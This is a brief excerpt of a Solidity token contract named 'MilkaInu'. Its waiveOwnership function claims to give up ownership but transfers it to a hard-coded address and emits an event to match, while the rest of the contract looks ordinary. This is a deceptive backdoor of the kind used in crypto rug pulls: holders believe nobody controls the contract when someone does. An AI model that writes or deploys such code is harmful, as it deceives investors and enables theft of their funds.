...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xeC265F30bEC165c35b05128592d9D9F8371234C8));
        _owner = address(0xeC265F30bEC165c35b05128592d9D9F8371234C8);
    }
...
contract MilkaInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "MilkaInu";
    string private _symbol = "MILKAINU";
